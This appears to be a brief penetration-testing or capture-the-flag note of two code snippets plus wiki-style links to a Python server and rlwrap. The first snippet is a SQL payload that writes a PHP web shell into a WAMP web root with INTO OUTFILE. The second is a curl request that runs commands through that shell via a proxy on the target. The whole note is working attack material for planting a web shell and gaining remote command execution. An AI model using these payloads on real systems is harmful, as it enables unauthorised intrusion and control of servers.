```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shelly.php';
```
```
curl "http://127.0.0.1:8080/shelly.php?cmd=whoami" --proxy $TARGET:3128
```
[[Python#Server]]
[[1._rlwrap]]
